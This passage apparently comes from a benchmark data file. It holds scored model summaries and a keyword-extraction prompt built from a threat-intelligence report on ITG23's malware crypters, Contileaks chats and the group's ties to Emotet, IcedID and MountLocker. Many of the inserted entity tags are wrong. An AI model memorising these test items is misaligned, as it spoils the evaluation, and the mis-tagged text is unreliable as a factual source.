forward. Well-resourced groups may solve problems by adding more time, money and tool development. The presentation notes that exposure provides benefits but security researchers must weigh these against potential loss of visibility into the threat actors. They should consider the intended impact, consequences, actor's adaptability, targeting determination, and likely TTP shifts. In summary, the presentation provides an insightful examination of how different types of threat actors respond when their operations are publicly exposed. It highlights the need for security researchers to carefully evaluate the tradeoffs around reporting. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4894736842105264, "gpt3/lexical/rouge_rouge2": 0.14814814814814814, "gpt3/lexical/rouge_rougeL": 0.2368421052631579, "gpt3/lexical/rouge_rougeLsum": 0.2368421052631579, "gpt3_generated_text": ["This article discusses the impact of public exposure on threat actors and their operations. It explores how threat groups respond when their operations are exposed in public reporting, highlighting the significant trigger for behavioral change that public exposure represents. The article also delves into the ethical boundaries and obligations faced by security researchers, as well as the best practices for sharing information about threat actors. It introduces the concept of threat shifting, where adversaries change their operations in response to perceived safeguards and countermeasures. The article provides case studies and examples of threat shifting in nature and information security, emphasizing the keen awareness of threat actors to research and reporting on their operations. It also discusses the impact of exposure on threat actors and the measures they take to adapt and evolve their tactics, techniques, and procedures. Overall, the article emphasizes the importance of public exposure in increasing threat groups' risk of detection and highlights the need for careful analysis and responsible sharing of information about threat actors."]}, {"split_name": "test", "sample_id": "test_61", "prompt_text": "Extract the keywords: securityintelligence.com /posts / itg23 - crypters - cooperation - between - cybercriminal - groups/ ITG23 Crypters Highlight Cooperation Between Cybercriminal GroupsMalware [DATE] May [DATE] 19 , [CARDINAL] 2022By [PERSON] Charlotte [PERSON] Hammond co - authored by [PERSON] Ole [PERSON] Villadsen , [PERSON] Golo [PERSON] M\u00fchr [CARDINAL] 25 min readIBM [ORG] Security X [ORG] - [ORG] Force researchers have continually analyzed the use of several crypters developed by the cybercriminal group ITG23 , also known as [PERSON] Wizard [PERSON] Spider , [DATE] DEV-0193 , or simply the \u201c [ORG] Trickbot [ORG] Group \u201d . The results of this research , along with evidence gained from the disclosure of internal ITG23 chat logs ( \u201c Contileaks \u201d ) , provide new insight into the connections and cooperation between prominent cybercriminal groups whose attacks often lead to ransomware . Crypters are applications designed to encrypt and obfuscate malware to evade analysis by antivirus scanners and malware analysts . Crypters generally operate by encrypting the pre - compiled malware payload and embedding it within a secondary binary , known as a stub , which contains code to decrypt and execute the malicious payload . The use of crypters allows malware developers to easily experiment with different methods of evading antivirus detection without having to make changes to the malware itself . X - Force analyzed [CARDINAL] thirteen crypters that have all been used with malware built or operated by ITG23 internal teams or [ORDINAL] third - party distributors \u2014 including [PERSON] Trickbot , [ORG] BazarLoader , [PERSON] Conti , and Colibri \u2014 as well as malware developed by other groups such as [PERSON] Emotet , IcedID , [PERSON] Qakbot , and [ORG] MountLocker . The presence of [CARDINAL] one of these crypters on a file sample is a strong indication that its developer , distributer , or operator is either a part of [GPE] ITG23 or has a partnership with the group . X [ORG] - [ORG] Force found evidence that ITG23 by [DATE] mid-2021 scaled up their efforts to crypt malware with the development of several new crypters and the construction of a Jenkins build server to automate the crypting of malware at scale . [ORG] X- [ORG] Force also observed the analyzed crypters used repeatedly by [PERSON] Emotet and IcedID malware samples , indicating ITG23 is also crypting malware for these groups . These findings add to a growing body of evidence indicating a close relationship between [GPE] ITG23 and the threat actors behind the development and operation of IcedID and Emotet . Additionally , X [ORG] - [ORG] Force uncovered that [CARDINAL] at [CARDINAL] least [CARDINAL] one ITG23 crypter has been used repeatedly since [DATE] late [DATE] February [DATE] 2022 with the [PERSON] Qakbot banking trojan and at least once with the [PERSON] Gozi banking trojan likely delivered by the [GPE] ITG23 distribution affiliate [PRODUCT] TA551 ( tracked by X [ORG] - [ORG] Force as Hive0106 ) . X [ORG] - [ORG] Force \u2019s analysis of these crypters has also uncovered a previously undisclosed relationship between the IcedID group and [PRODUCT] MountLocker ransomware - as - a - service ( RaaS ) operation . A Tangled Web They Weave ITG23 \u2019s \u201c [WORK_OF_ART] Build [WORK_OF_ART] Machine\u201dITG23 is a cybercriminal gang known primarily for developing the [PERSON] Trickbot banking [GPE] Trojan , which was [ORDINAL] first identified in [DATE] 2016 and initially used to facilitate online banking fraud . The group since that time expanded its operations to develop and operate new malware such as [PRODUCT] BazarLoader and [LOC] Anchor . ITG23 also adapted to the ransomware economy by using its payloads to gain a foothold in victim environments for ransomware attacks and developing and operating the [PERSON] Conti and Diavol RaaS operations . ITG23 is best thought of as a group of groups , not unlike a large corporation , who report to common \u201c upper management \u201d and share infrastructure and support functions , such as IT and human resources . [CARDINAL] One of these support groups within [GPE] ITG23 is dedicated to developing crypters for use with the group \u2019s own malware operations as well as for several other groups . ITG23 have been crypting their malware for [DATE] several [DATE] years , and crypters used by the group were regularly seen in use with malware such as [ORG] Trickbot , [ORG] Emotet , [ORG] Cobalt [ORG] Strike [ORG] and [ORG] Ryuk . However , the development of multiple new crypters1/19during [DATE] the [DATE] past [DATE] year suggests a focused effort to scale up their crypting operation . Evidence gained from several sources , including [ORG] ContiLeaks , indicates that [GPE] ITG23 has set up a Jenkins build server to automate the mass crypting of malware , also referred to as [ORG] the \u201c [ORG] Build [ORG] Machine \u201d . Jenkins is an open - source automation server designed to automate the building , testing , and deploying of software . [ORG] The \u201c [ORG] Build [ORG] Machine \u201d was created in [DATE] April [DATE] 2021 , coinciding with an increase in the use of crypters with malware developed by ITG23 and other groups . Since that time , ITG23 crypters have been applied to : [ORG] Malware used to gain a foothold in victim environments , such as [ORG] Trickbot , [ORG] BazarLoader , Sliver , IcedID , [PERSON] Emotet , [PERSON] Qakbot , and [PERSON] Gozi . We even identified ITG23 crypters with [GPE] Colibri , a loader advertised on underground forums that was used to download [PERSON] Trickbot in [DATE] fall [DATE] of [DATE] 2021 , likely by an internal ITG23 distribution affiliate . Some of these malware families are built by [GPE] ITG23 , such as [ORG] Trickbot and [ORG] BazarLoader , and others are built by different groups , such as IcedID , [PERSON] Emotet , and [PERSON] Qakbot . ITG23 distribution affiliates have deployed Sliver , an open source , cross - platform adversary simulation and red team platform , probably to gain access for ITG23 internal red teams to conduct ransomware attacks . Cobalt Strike beacon samples downloaded during attacks commencing with the above malware and used by internal red teams or other affiliates when performing ransomware attacks . Ransomware such as [ORG] Conti and [ORG] MountLocker , also known as [ORG] Xinglocker , [ORG] AstroLocker , and [ORG] Quantum , which are often deployed following an infection with the above tools and malware . ITG23 has discontinued use of [PERSON] Trickbot and [ORG] BazarLoader as of [DATE] December [DATE] 2021 and [DATE] February [DATE] 2022 , respectively , but X - Force continues to observe the crypters leveraged by other malware , including IcedID , [PERSON] Emotet , [PERSON] Conti , [PERSON] Qakbot , and the adversary simulation software [PERSON] Cobalt [PERSON] Strike . [CARDINAL] One notable exception is the [LOC] Anchor malware which although attributed to ITG23 does not tend to use the same crypters as the other malware mentioned throughout this report . The [LOC] Anchor malware was commonly observed using a separate crypter , named ShellStarter , which has some code overlap with Anchor itself and was likely created by the same developer . The ShellStarter crypter was also regularly used with Cobalt Strike payloads , but otherwise did not seem to be used for general crypting operations . We are also currently analyzing [PRODUCT] Bumblebee malware samples which we have also linked to ITG23 to determine if they are using an ITG23 crypter . ContiLeaksIn [DATE] February [DATE] 2022 , a [GPE] Ukrainian security researcher using the [PRODUCT] Twitter handle \u201c ContiLeaks \u201d revealed a wealth of information about [GPE] ITG23 and its operations , including private conversations between its members . While these leaks appeared to concentrate on the Conti RaaS operation , they also show that it was part of the larger ITG23 \u201c corporation \u201d which also includes ITG23 \u2019s crypting operation . These chats indicate that the head of this crypting operation uses the handle \u201c Bentley \u201d , who manages a team of developers responsible for both developing the crypters and crypting malware for affiliates and partners . Bentley in turn regularly provides status reports to \u201c [PRODUCT] Mango \u201d , a more senior manager within [GPE] ITG23 who reports to the group \u2019s former leader \u201c Stern . \u201d Other security researchers have also identified [ORG] Bentley and his role managing the crypting team . Below is an example of a status update on malware crypting that [ORG] Bentley would send on a regular basis to [PRODUCT] Mango . Date : Aug 26 , [DATE] 2021 [DATE] @ [DATE] 11:08:21.000 From : bentley@q3mcco35auwcstmt.onion To : mango@q3mcco35auwcstmt.onion Message : \u041f\u0440\u043e\u0435\u043a\u0442 \u043b\u0435\u043e - 13 \u043a\u0440\u0438\u043f\u0442\u043e\u0432 . [PERSON] \u0411\u0438\u043b\u0434 \u043c\u0430\u0448\u0438\u043d\u0430 ( [ORG] Project [ORG] leo [ORG] - [ORG] 13 crypts . [PERSON] Build [PERSON] Machine ) \u0411\u041a ( [ORG] BK ) \u0433\u0440\u0443\u043f\u043f\u0430 [CARDINAL] 15 : [QUANTITY] 20 [QUANTITY] \u043a\u0440\u0438\u043f\u0442\u043e\u0432 , \u0431\u0438\u043b\u0434 \u043c\u0430\u0448\u0438\u043d\u0430 ( group [CARDINAL] 15 : [CARDINAL] 20 crypts , build machine ) \u0433\u0440\u0443\u043f\u043f\u0430 [CARDINAL] 19 : [CARDINAL] 5 \u043a\u0440\u0438\u043f\u0442\u0430 , \u0431\u0438\u043b\u0434 \u043c\u0430\u0448\u0438\u043d\u0430 ( group [CARDINAL] 19 : [CARDINAL] 5 crypts , build machine ) \u0433\u0440\u0443\u043f\u043f\u0430 [CARDINAL] 20 : [CARDINAL] 1 \u043a\u0440\u0438\u043f\u0442\u043e , \u0431\u0438\u043b\u0434 \u043c\u0430\u0448\u0438\u043d\u0430 ( group [CARDINAL] 20 : [CARDINAL] 1 crypt , build machine ) \u0422\u0440\u0438\u043a : ( Trick ) [CARDINAL] 4 \u0434\u043b\u043b : [CARDINAL] 2 \u0441\u044d\u043c 2 \u043d\u0435\u0432\u0438\u043b ( [CARDINAL] 4 dll : [CARDINAL] 2 sam [CARDINAL] 2 nevil ) \u0422\u0440\u043e\u0439\u043a\u0430 : ( [PERSON] Troika:)2/19\u043d\u0435\u0432\u0438\u043b ( nevil ) \u0428\u0435\u043b\u043a\u043e\u0434 : \u0431\u0438\u043b\u0434 \u043c\u0430\u0448\u0438\u043d\u0430 ( [PERSON] Shellcode : Build Machine ) [PERSON] \u041a\u043e\u0431\u0430\u043b\u044c\u0442 : \u0431\u0438\u043b\u0434 \u043c\u0430\u0448\u0438\u043d\u0430 ( Cobalt : Build Machine)Chat logs from the [ORG] ContiLeaks also provide details about the creation of the build machine . On [DATE] April [DATE] 15 , [DATE] 2021 , [PERSON] Mango informed Stern that the build machine for the crypters would be ready by [DATE] the [DATE] end [DATE] of [DATE] April [DATE] 2021 . Mango \u2192 Stern : \u0431\u0438\u043b\u0434 \u043c\u0430\u0448\u0438\u043d\u0430 \u0434\u043b\u044f \u043a\u0440\u0438\u043f\u0442\u043e\u0440\u043e\u0432 \u0431\u0443\u0434\u0435\u0442 \u0433\u043e\u0442\u043e\u0432\u0430 \u043a \u043a\u043e\u043d\u0446\u0443 \u043c\u0435\u0441\u044f\u0446\u0430 , \u0432\u0447\u0435\u0440\u0430 \u0443\u0436\u0435 \u043d\u0430\u0447\u0430\u043b\u0438 \u043e\u0431\u043a\u0430\u0442\u044b\u0432\u0430\u0442\u044c \u0435\u0435 \u043d\u043e \u043f\u043e\u043a\u0430 \u0441\u044b\u0440\u043e\u0432\u0430\u0442\u0430 ( The build machine for cryptors will be ready by [DATE] the [DATE] end [DATE] of [DATE] the [DATE] month , [DATE] yesterday they already started to run it in , but it \u2019s still raw)On [DATE] June [DATE] 7 , [DATE] 2021 , [ORG] Bentley provides an update to Stern on the status of the transition of work to the build machine . Bentley \u2192 Stern : \u0414\u0435\u043b\u0430 - \u0445\u043e\u0440\u043e\u0448\u043e . \u0418\u043d\u0442\u0435\u0440\u0435\u0441\u043d\u043e \u0438 \u043d\u0430\u0441\u044b\u0449\u0435\u043d\u043e . \u0412\u0441\u0435 \u043a\u0440\u0438\u043f\u0442\u043e\u0440\u044b \u043f\u0435\u0440\u0435\u0448\u043b\u0438 \u0438\u0437 \u0440\u0443\u0447\u043d\u043e\u0433\u043e \u0442\u0440\u0443\u0434\u0430 \u0432 \u0430\u0432\u0442\u043e\u043c\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0443\u0439 \u0441\u0431\u043e\u0440\u043a\u0443 \u0447\u0435\u0440\u0435\u0437 \u0431\u0438\u043b\u0434 \u043c\u0430\u0448\u0438\u043d\u0443 . \u0422\u0435\u043f\u0435\u0440\u044c \u043e\u043d\u0438 \u0437\u0430\u043d\u0438\u043c\u0430\u044e\u0442\u0441\u044f \u0430\u043a\u0442\u0443\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0435\u0439 \u0438 \u0447\u0438\u0441\u0442\u043a\u043e\u0439 \u0441\u0442\u0430\u0431\u043e\u0432 . \u0410 \u0444\u0430\u0439\u043b\u044b \u044f \u0434\u0435\u043b\u0430\u044e \u043d\u0430 \u0431\u0438\u043b\u0434 \u043c\u0430\u0448\u0438\u043d\u0435 , \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u044e \u0438 \u0432\u044b\u0434\u0430\u044e . \u0415\u0441\u043b\u0438 \u0447\u0442\u043e - \u0442\u043e \u0431\u0438\u043b\u0434\u0438\u0442\u0441\u044f \u0433\u0440\u044f\u0437\u043d\u044b\u043c - \u043e\u0431\u0440\u0430\u0449\u0430\u044e\u0441\u044c \u043a \u043a\u0440\u0438\u043f\u0442\u043e\u0440\u0443 . \u041e\u043d \u0447\u0438\u0441\u0442\u0438\u0442 \u0441\u0442\u0430\u0431 . [GPE] \u0421\u043d\u043e\u0432\u0430 \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c \u0438 [CARDINAL] 1 . [ORG] \u041a\u0440\u0438\u043f\u0442\u043e\u0432\u0430\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u043e\u0432 \u0434\u043b\u044f [PERSON] \u041b\u0435\u043e \u043d\u0430 \u0431\u0438\u043b\u0434 \u043c\u0430\u0448\u0438\u043d\u0435 . [CARDINAL] 2 . [ORG] \u0428\u0435\u043b\u043a\u043e\u0434 \u043a\u043e\u0431\u0430\u043b\u044c\u0442 [CARDINAL] 3 . \u041b\u043e\u043a\u0435\u0440\u044b [CARDINAL] 4 . \u041a\u043e\u0430\u0431\u0430\u043b\u044c\u0442 \u0435\u0445\u0435 \u0438 \u0434\u043b\u043b [CARDINAL] 5 . dll \u0442\u0440\u0438\u043a\u0430 [CARDINAL] 6 . \u041e\u0431\u0443\u0447\u0430\u044e \u0438 \u043f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u043b\u044e\u044f \u0434\u043e\u0441\u0442\u0443\u043f \u0434\u0440\u0443\u0433\u0438\u043c \u0447\u043b\u0435\u043d\u0430\u043c \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u043a \u0431\u0438\u043b\u0434 \u043c\u0430\u0448\u0438\u043d\u0435 , \u0447\u0442\u043e\u0431\u044b \u043e\u043d\u0438 \u043c\u043e\u0433\u043b\u0438 \u0441\u0430\u043c\u0438 \u0441\u043e\u0431\u0438\u0440\u0430\u0442\u044c \u043a\u0440\u0438\u043f\u0442\u044b . [CARDINAL] 7 . [PERSON] \u041f\u043e\u0434\u0433\u043e\u0442\u043e\u0432\u0430\u043a\u0430 \u043b\u0438\u043d\u043a\u043e\u0432 \u0434\u043b\u044f \u043d\u0430\u0433\u0440\u0443\u0437\u043a\u0438 \u0438 \u0442\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u0435\u0445\u0435\u043b\u0435\u0439 \u0434\u043b\u044f netwalker , hash , cherry . Everything is OK . Interesting and rich . All cryptors have moved from manual labor to automatic assembly through the build machine . Now they are engaged in updating and cleaning stubs . And I make files on the build machine , check and issue . If something is being built dirty , I turn to cryptor . He cleans the stub . Check again [CARDINAL] 1 . Crypting files for [PERSON] Leo on the build machine . [CARDINAL] 2 . Cobalt shellcode [CARDINAL] 3 . Lockers 4 . Cobalt exe and dll [CARDINAL] 5 . [ORG] Trickbot dll [CARDINAL] 6 . Educate and give other team members access to the build machine so that they can collect the crypts themselves . [CARDINAL] 7 . Preparing links for loading and testing excels for netwalker , hash , cherry . Within the [ORG] ContiLeaks , there are multiple references to the use of a Jenkins server for [ORG] the [ORG] Build [ORG] Machine . In [CARDINAL] one such example , on [DATE] January 17 , [DATE] 2022 , [CARDINAL] two ITG23 developers \u201c derekson \u201d and \u201c elon \u201d discuss the Jenkins server . X [ORG] - [ORG] Force also uncovered [ORG] Program [ORG] Database ( PDB ) file paths used by ITG23 crypters that reference [PERSON] Jenkins ( see below for more details ) . Derekson \u2192 Elon : [PERSON] \u041f\u0440\u0438\u0432\u0435\u0442 . \u041f\u043e\u0447\u0442\u0438 \u0437\u0430\u043a\u043e\u043d\u0447\u0438\u043b \u0441\u043e \u0432\u0442\u043e\u0440\u044b\u043c \u0441\u0435\u0440\u0432\u0435\u0440\u043e\u043c . \u0421\u043a\u0430\u0436\u0438 \u043a\u043e\u0433\u0434\u0430 \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c \u043a \u0434\u0436\u0435\u043d\u043a\u0438\u043d\u0441\u0443 \u0434\u043b\u044f \u0442\u0435\u0441\u0442\u0430?3/19(Hello . Almost finished with the [ORDINAL] second server . Tell me when can I connect to jenkins for a test?)Throughout the leaked chats , there are multiple examples of [ORG] Bentley delivering crypted malware samples to affiliates and partners such as [PERSON] Cherry , Netwalker , and [PERSON] Zeus . X - Force assesses that \u201c zevs \u201d ( \u201c zeus \u201d ) is affiliated with the prominent distribution group Hive0106 ( aka [PRODUCT] TA551 ) , which used the gtags \u2018 zev , \u2019 \u2018 zem \u2019 and \u2018 zvs \u2019 during their [PERSON] Trickbot campaigns . Hive0106 is a prominent distribution affiliate with an established relationship with [GPE] ITG23 . Throughout the chats , \u201c zeus \u201d is alternatively translated as \u201c \u0437\u0435\u0432\u0441\u0430 \u201d , \u201c \u0437\u0435\u0432\u0441\u043e\u043c \u201d , \u201c \u0437\u0435\u0432\u0441\u0443 \u201d , and \u201c \u0437\u0435\u0432\u0441 \u201d depending on the grammatical case . For example , on [DATE] Aug [DATE] 10 , [DATE] 2021 , [ORG] Bentley sends the following request to [GPE] Hof , a developer associated with [PERSON] Trickbot malware : Bentley \u2192 Hof : \u0414\u043e\u0431\u0440\u043e\u0435 \u0443\u0442\u0440\u043e . [CARDINAL] \u0421\u0434\u0435\u043b\u0430\u0439 , \u043f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430 , zev4.dll \u0438 zem1.dll \u0434\u043b\u044f \u0417\u0435\u0432\u0441\u0430 ( Good morning . Please make zev4.dll and zem1.dll for Zeus)The following messages also indicate crypted samples were prepared for [PERSON] Zevs : [DATE] August 31 , [DATE] 2021 : Bentley \u2192 Zevs : [PERSON] \u0415\u0449\u0435 \u043e\u0442\u0432\u0435\u0442 : \u0443 \u043d\u0430\u0441 \u0435\u0441\u0442\u044c \u043e\u043f\u044b\u0442 \u0441\u0435\u0440\u0438\u0439\u043d\u043e\u0439 \u0432\u044b\u0434\u0430\u0447\u0438 \u043a\u0440\u0438\u043f\u0442\u043e\u0432 \u043f \u0411\u041a * \u0443\u0436\u0435 , \u043e\u0434\u0438\u043d \u0437\u0430\u043a\u0430\u0437\u0447\u0438\u043a \u0431\u0435\u0440\u0435\u0442 \u043f\u0430\u0440\u0442\u0438\u044f\u043c\u0438 \u043f\u043e [CARDINAL] 30 [CARDINAL] - 100 \u0448\u0442\u0443\u043a ( Another answer : we have experience in the serial issuance of crypts and [ORG] BK * already , [CARDINAL] one customer takes in batches of [CARDINAL] 30 - 100 pieces ) [DATE] September 24 , [DATE] 2021 : Neo \u2192 Zevs : \u043c\u043e\u043d\u0442 \u043c\u043e\u043b\u0447\u0438\u0442 , \u044f \u043a\u0440\u0438\u043f\u0442\u044b \u0433\u043e\u0442\u043e\u0432\u0438\u043b [CARDINAL] 3 \u0448\u0442\u0443\u043a\u0438 \u043a [CARDINAL] 8 \u043f\u043e \u043c\u0441\u043a ( Mont is silent , I prepared [CARDINAL] 3 crypts by [CARDINAL] 8 [GPE] Moscow time)*We assess \u0411\u041a ( [ORG] BK ) likely is a reference to [PRODUCT] BazarLoader based on analyzing multiple chat references to this acronym . [PERSON] Emotet and IcedID : Longtime PalsThe use of ITG23 crypters with [PERSON] Emotet and IcedID malware is the latest evidence of a close relationship with these groups that has featured distributing each other \u2019s malware and cooperating on malware development . Emotet [ORDINAL] first appeared in [DATE] 2014 as a banking trojan and later emerged as a prominent downloader for other banking trojans , including IcedID , [PERSON] Qakbot , and [PERSON] Trickbot . IcedID , also known as [ORG] Bokbot and often referred to by ITG23 as [ORG] Anubis , is a banking trojan [ORDINAL] first discovered by X [ORG] - [ORG] Force in [DATE] September [DATE] 2017 . Since that time IcedID \u2014 like many banking trojans \u2014 has evolved to include backdoor and data harvesting capabilities and is often used as a downloader for other malware , including [PERSON] Cobalt [PERSON] Strike and ransomware . Emotet : ITG23 and the [PERSON] Emotet group have a history of seeding each other \u2019s malware . ITG23 has used [PERSON] Emotet extensively to deliver [PERSON] Trickbot malware often leading to the notorious [ORG] Emotet [ORG] - > [ORG] Trickbot [ORG] - > [ORG] Ryuk ransomware attack sequence . Following actions to disrupt [ORG] Trickbot group operations in [DATE] fall [DATE] 2020 , [PERSON] Emotet moved quickly to assist ITG23 \u2019s recovery by downloading [PERSON] Trickbot malware to infected machines . [DATE] A [DATE] year [DATE] later , ITG23 returned the favor by seeding [PERSON] Emotet samples to facilitate [ORG] Emotet \u2019s return following the [DATE] January [DATE] 2021 international law enforcement operation against the group . The presence of \u201c Veron \u201d aka \u201c Mors \u201d participating in conversations with ITG23 members in the leaked chats also points to [GPE] ITG23 \u2019s close cooperation with [PERSON] Emotet . Historically , \u201c mors \u201d was a gtag used with [PERSON] Trickbot samples delivered by [PERSON] Emotet . Based on the conversations , [ORG] Veron / Mors appears to be a liaison to ITG23 for [PERSON] Emotet related matters . [ORG] Veron / Mors also seemed to work with the crypting team , and messages can be found from [ORG] Bentley which discuss crypting files for [ORG] Veron . Bentley sent the following messages to Veron and Stern [DATE] between [DATE] February [DATE] and [DATE] May [DATE] 2021 possibly related to crypting [PERSON] Emotet samples for testing purposes before [ORG] Emotet \u2019s reappearance in [DATE] November : [DATE] February 24 , [DATE] 2021 : Stern \u2192 Bentley : veron \u0437\u0430\u043f\u0443\u0441\u0442\u0438\u043b\u0441\u044f ? ( Veron started?)4/19Bentley \u2192 Stern : \u041e\u043d \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442 \u0432 \u043c\u0430\u0440\u0442\u0435 . [PERSON] \u0420\u0430\u0431\u043e\u0442\u0430\u0435\u043c \u043d\u0430\u0434 \u043a\u0440\u0438\u043f\u0442\u0430\u043c\u0438 \u0434\u043b\u044f \u043d\u0435\u0433\u043e . \u043d\u0430\u0448\u0438\u0445 \u043a\u0440\u0438\u043f\u0442\u043e\u0440\u0430 ( He starts in [DATE] March . We 're working over the crypters for him . Our crypters ) [DATE] March [DATE] 1 , [DATE] 2021 : Stern \u2192 Bentley : veron \u043d\u0435 \u043d\u0430\u0447\u0430\u043b \u0435\u0449\u0435 ? ( [ORG] Veron has n't started yet ? ) Bentley \u2192 Stern : [GPE] \u041f\u0440\u0432\u0438\u0435\u0442 . [PERSON] \u0415\u0449\u0435 \u043d\u0435 \u043d\u0430\u0447\u0430\u043d\u0430\u043b . \u0421\u0434\u0435\u043b\u0430\u043b\u0438 \u0433\u043e\u0434\u0435\u044b\u0439 \u043a\u0440\u0438\u043f\u0442 \u0435\u0433\u043e \u0434\u043b\u043b . \u0416\u0434\u0435\u043c \u043a\u0430\u043a \u0434\u0430\u0441\u0442 \u043f\u043e\u043b\u043d\u0443\u044e [TIME] \u0432\u0435\u0440\u0441\u0438\u044e \u0441\u043e \u0432\u0441\u0435\u043c\u0438 \u043d\u044c\u044e\u0430\u043d\u0441\u0430\u043c\u0438 ( Hi . Not started yet . Made a suitable crypter for his dll . We 're waiting for a full version with all the nuances . ) [DATE] May [DATE] 5 , [DATE] 2021 Bentley \u2192 Veron : \u041c\u043e\u0436\u0435\u0448\u044c \u0434\u0430\u0442\u044c \u0434\u043b\u043b \u043d\u0430 \u043a\u0440\u0438\u043f\u0442 ? [ORG] \u041f\u043e\u043a\u0430 \u043c\u043e\u0436\u0435\u043c \u043d\u0430\u0447\u0430\u0442\u044c \u043a\u0440\u0438\u043f\u0442\u043e\u0432\u0430\u0442\u044c \u0438 \u0433\u043e\u0442\u043e\u0432\u0438\u0442\u044c \u0441\u0442\u0430\u0431\u044b ( Can you give a dll for the crypt ? For now , we can start to crypt and prepare stubs)Messages between Veron and Stern in [DATE] May [DATE] 2021 seem to suggest that the return of [PERSON] Emotet may have been delayed due a need to rewrite parts of the code for security purposes . [DATE] May 18 , [DATE] 2021 : Stern \u2192 Veron : \u043f\u0440\u0438\u0432\u0435\u0442 . \u043a\u043e\u0433\u0434\u0430 \u0441\u0442\u0430\u0440\u0442\u0443\u0435\u043c ? ( Hi , when are we starting ? ) Veron \u2192 Stern : \u043f\u0440\u0438\u0432\u0435\u0442 , \u044f \u0441\u043a\u0430\u0436\u0443 \u043a\u043e\u0433\u0434\u0430 \u0442\u043e\u0447\u043d\u043e , \u0432 \u0431\u043b\u0438\u0436\u0430\u0439\u0448\u0435\u0435 \u0432\u0440\u0435\u043c\u044f \u0443\u0436\u0435 , \u0434\u0435\u043b\u0430\u044e \u0447\u0442\u043e\u0431\u044b \u043d\u0435 \u0432\u0437\u043b\u043e\u043c\u0430\u043b\u0438 ( Hello , I 'll tell you exactly when , in the near future already , I 'm doing it so that they do n't get hacked ) [DATE] May 24 , [DATE] 2021 : Veron \u2192 Stern : \u043f\u0440\u0438\u0432\u0435\u0442 , \u0441\u043e\u0440\u0440\u0438 , \u0447\u0442\u043e \u0437\u0430\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u0435\u043c , \u043d\u043e \u043d\u0430\u0434\u043e \u043f\u0435\u0440\u0435\u043f\u0438\u0441\u0430\u0442\u044c \u0447\u0430\u0441\u0442\u044c , \u044f \u0437\u0430 \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u044c \u043d\u0430\u043f\u0438\u0448\u0438 \u043a\u0430\u043a \u0431\u0443\u0434\u0435\u0448\u044c , \u0435\u0441\u043b\u0438 \u0432\u043e\u043f\u0440\u043e\u0441\u044b \u0435\u0441\u0442\u044c ( hello , sorry for the delay , but we need to rewrite part , I 'm for security let me know if you have any questions)IcedID : The [ORDINAL] first evidence of ITG23 \u2019s cooperation with the IcedID group appeared in [DATE] May [DATE] 2018 when security researchers observed IcedID downloading [PERSON] Trickbot malware . [DATE] Several [DATE] months [DATE] later other researchers noted [PERSON] Trickbot returning the gesture and downloading an updated IcedID variant that incorporated features used with [PERSON] Trickbot samples , suggesting that the [CARDINAL] two groups also collaborated on development . In [DATE] early [DATE] 2019 , other analysts observed IcedID using a custom [PERSON] Trickbot shareDLL module to download core [PERSON] Trickbot malware . These researchers [DATE] a [DATE] month [DATE] later described a new [ORG] Trickbot proxy module for man - in - the - middle ( MITM ) attacks against web browsers that was highly similar to the IcedID proxy module . A [PERSON] Trickbot module named anubisDll32 was also developed containing the IcedID core code . In [DATE] November [DATE] 2021 , X [ORG] - [ORG] Force and other researchers observed multiple campaigns during which [ORG] BazarLoader was used to download IcedID malware . ITG23 \u2019s leaked chats provide additional insight into ITG23 \u2019s close relationship with IcedID , although the exact nature of this relationship remains unclear . On [DATE] May [DATE] 1 , [DATE] 2021 , [PERSON] Stern congratulates \u201c [PERSON] Leo \u201d on his \u201c cool bot IcedID \u201d for gaining the attention of security researchers , revealing that [PERSON] Leo is likely affiliated with the IcedID group . Stern \u2192 Leo : \u0430 \u0442\u0432\u043e\u0439 \u043a\u0440\u0443\u0442\u043e\u0439 \u0431\u043e\u0442 [PERSON] ICEDld ( and your cool ICEDId bot ) Stern \u2192 Leo : \u043f\u0440\u043e \u043d\u0435\u0433\u043e \u043f\u0438\u0448\u0443\u0442 \u0438\u0441\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u0438 ( researchers write about it ) Stern \u2192 [PERSON] Leo : \u0447\u0442\u043e \u0442\u044b \u0441\u0435\u0439\u0447\u0430\u0441 \u043d\u0430 \u043f\u0435\u0440\u0432\u043e\u043c \u043c\u0435\u0441\u0442\u0435 ( that you 're in the [ORDINAL] first place)The leaked chats often refer to a \u201c [WORK_OF_ART] Project [WORK_OF_ART] Leo \u201d , which we assess is a reference to IcedID . Bentley regularly provides [LOC] Mango with updates on crypting related to \u201c [WORK_OF_ART] Project [WORK_OF_ART] Leo \u201d and in [DATE] November [DATE] 2021 , [PERSON] Stern messaged the following5/19instruction to Bentley : Stern \u2192 Bentley : \" \u0432\u043a\u043b\u044e\u0447\u0438 \u043a\u0440\u0438\u043f\u0442\u044b \u043b\u0435\u043e ( turn on the crypts of [GPE] Leo)\"IcedID and MountLocker RansomwareX - Force uncovered evidence that ITG23 crypters were used with [ORG] MountLocker ( see below ) , a ransomware - as - a- service ( RaaS ) operation that has been active since [DATE] July [DATE] 2020 . Since then , [ORG] MountLocker has rebranded several times to other names including [ORG] XingLocker , [ORG] AstroLocker , and [ORG] Quantum . This evidence \u2014 combined with code overlap between IcedID and [PRODUCT] MountLocker ransomware and the use of IcedID alongside [ORG] MountLocker during multiple ransomware attacks \u2014 suggests that the IcedID group operates the [PRODUCT] MountLocker [PRODUCT] RaaS.The following conversation between [PERSON] Stern and Bentley on [DATE] May [DATE] 6 , [DATE] 2021 , provides additional evidence that [PERSON] Leo , who operates IcedID , also has some involvement with ransomware . Stern asks [ORG] Bentley which \u2018 lockers \u2019 , aka ransomware , his team have been crypting , and [ORG] Bentley responds that they have had binaries from [PERSON] Reshaev 